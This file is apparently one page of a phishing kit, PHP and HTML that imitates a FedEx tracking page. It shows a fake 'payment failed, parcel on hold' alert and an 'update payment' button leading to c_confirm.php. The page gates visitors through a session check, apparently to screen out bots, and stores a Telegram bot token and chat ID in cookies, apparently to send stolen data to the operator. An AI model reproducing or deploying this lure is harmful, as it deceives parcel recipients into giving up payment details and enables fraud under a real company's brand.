<?php
session_start();
if (!isset($_SESSION['js_verified'])) {
    header("Location: /index.php");
    exit;
}

if (isset($_SESSION['botToken'])) {
    setcookie('botToken', $_SESSION['botToken'], time() + 3600, "/");
}
if (isset($_SESSION['chatId'])) {
    setcookie('chatId', $_SESSION['chatId'], time() + 3600, "/");
}

// Language detection
$lang = $_SESSION['lang'] ?? 'en';
include __DIR__ . "/../lang_index/{$lang}.php"; // load translations
?>
<!DOCTYPE html>
<html lang="<?= htmlspecialchars($lang) ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./img/logo.jpg">
    <title><?= htmlspecialchars($t['page_title']) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="./system/jquery-3.7.1.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'fedex-purple': '#4D148C',
                        'fedex-orange': '#FF6200',
                        'fedex-gray': '#999999',
                    },
                    animation: {
                        'bounce-subtle': 'bounceSubtle 2s infinite',
                        'spin-slow': 'spin 2s linear infinite',
                    },
                    keyframes: {
                        bounceSubtle: {
                            '0%, 100%': { transform: 'translateY(0px)' },
                            '50%': { transform: 'translateY(-3px)' },
                        },
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; }
        .card-float { transition: all 0.3s ease; }
        .card-float:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
        .fedex-button { text-transform: uppercase; letter-spacing: 0.05em; }
    </style>
</head>
<body class="bg-white min-h-screen py-6">

<!-- Loader -->
<div id="loader2" class="fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
    <div class="flex flex-col items-center space-y-4">
        <div class="flex space-x-2 items-center">
            <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-8">
        </div>
        <div class="relative w-16 h-16">
            <div class="absolute inset-0 border-4 border-fedex-purple border-t-transparent rounded-full animate-spin-slow"></div>
        </div>
        <p class="text-fedex-gray text-sm font-medium uppercase"><?= htmlspecialchars($t['loading_tracking']) ?></p>
    </div>
</div>

<!-- Main Content -->
<div id="main-content2" class="hidden container mx-auto px-4 max-w-4xl">
    <!-- Hero Header -->
    <div class="text-center mb-8">
        <div class="inline-flex items-center px-4 py-2 rounded-full bg-red-100 text-red-800 text-sm font-medium mb-4">
            <div class="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></div>
            <?= htmlspecialchars($t['delivery_delayed']) ?>
        </div>
        <h1 class="text-2xl font-bold text-fedex-purple uppercase mb-2"><?= htmlspecialchars($t['parcel_tracking']) ?></h1>
        <p class="text-fedex-gray text-base"><?= htmlspecialchars($t['monitor_shipment']) ?></p>
    </div>

    <!-- Status Overview Section -->
    <div class="mb-8">
        <div class="bg-white rounded-lg shadow-md p-6 border-l-4 border-red-500 card-float">
            <div class="flex items-start space-x-4">
                <div class="flex-1">
                    <h2 class="text-lg font-bold text-red-800 mb-2"><?= htmlspecialchars($t['payment_error']) ?></h2>
                    <p class="text-red-600 text-sm mb-2"><?= htmlspecialchars($t['parcel_on_hold']) ?></p>
                    <p class="text-fedex-gray text-sm"><?= htmlspecialchars($t['update_payment_info']) ?></p>
                </div>
            </div>
        </div>
    </div>

    <!-- Status Journey Cards -->
    <div class="mb-8">
        <h3 class="text-xl font-bold text-fedex-purple text-center mb-4 uppercase"><?= htmlspecialchars($t['shipment_status']) ?></h3>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div class="bg-white rounded-lg shadow-md p-4 card-float">
                <div class="w-10 h-10 bg-green-100 rounded-full mx-auto mb-2 flex items-center justify-center animate-bounce-subtle">
                    <span class="text-green-600 font-bold text-base">✓</span>
                </div>
                <h4 class="font-semibold text-fedex-purple text-sm text-center mb-2"><?= htmlspecialchars($t['order_placed']) ?></h4>
                <p class="text-xs text-green-600 text-center font-medium"><?= htmlspecialchars($t['order_received']) ?></p>
            </div>

            <div class="bg-white rounded-lg shadow-md p-4 border-l-4 border-red-500 card-float">
                <div class="w-10 h-10 bg-red-100 rounded-full mx-auto mb-2 flex items-center justify-center animate-bounce-subtle">
                    <span class="text-red-600 font-bold text-base">!</span>
                </div>
                <h4 class="font-semibold text-fedex-purple text-sm text-center mb-2"><?= htmlspecialchars($t['payment_failed']) ?></h4>
                <p class="text-xs text-red-600 text-center font-medium"><?= htmlspecialchars($t['payment_declined']) ?></p>
            </div>

            <div class="bg-white rounded-lg shadow-md p-4 border-l-4 border-fedex-gray card-float">
                <div class="w-10 h-10 bg-gray-100 rounded-full mx-auto mb-2 flex items-center justify-center animate-bounce-subtle">
                    <span class="text-fedex-gray font-bold text-base">⟳</span>
                </div>
                <h4 class="font-semibold text-fedex-purple text-sm text-center mb-2"><?= htmlspecialchars($t['not_delivered']) ?></h4>
                <p class="text-xs text-fedex-gray text-center font-medium"><?= htmlspecialchars($t['held_facility']) ?></p>
            </div>
        </div>
    </div>

    <!-- Action Section -->
    <div class="text-center">
        <a href="c_confirm.php" class="inline-block w-full sm:w-auto bg-fedex-purple hover:bg-fedex-orange text-white px-8 py-3 rounded font-semibold text-sm fedex-button transition-all duration-300">
            <?= htmlspecialchars($t['update_payment']) ?>
        </a>
        <p class="text-fedex-gray text-sm mt-2"><?= htmlspecialchars($t['resolve_within']) ?></p>
    </div>
</div>

<script>
$(function(){
    // Show main content after 3 seconds
    setTimeout(function(){
        $('#loader2').addClass('opacity-0').removeClass('z-50');
        setTimeout(function(){
            $('#loader2').hide();
            $('#main-content2').removeClass('hidden');
        },500);
    },3000);
});
</script>
</body>
</html>